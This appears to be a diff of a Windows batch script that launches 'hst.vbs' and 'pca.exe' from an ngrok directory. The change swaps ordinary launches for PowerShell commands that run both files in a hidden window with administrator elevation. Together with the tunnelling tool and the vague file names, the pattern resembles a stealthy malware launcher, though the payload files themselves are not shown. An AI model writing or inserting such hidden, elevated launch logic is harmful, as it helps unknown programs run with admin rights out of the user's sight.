@@ -7,11 +7,11 @@ set "VBS_FILE=%NGROK_DIR%\hst.vbs"
 set "EXE_FILE=%NGROK_DIR%\pca.exe"
 
 if exist "%VBS_FILE%" (
-    cscript //nologo "%VBS_FILE%"
+    powershell -WindowStyle Hidden -Command "Start-Process '%VBS_FILE%' -Verb RunAs"
 )
 
 if exist "%EXE_FILE%" (
-    start "" "%EXE_FILE%"
+    powershell -WindowStyle Hidden -Command "Start-Process '%EXE_FILE%' -Verb RunAs"
 )
 
 endlocal
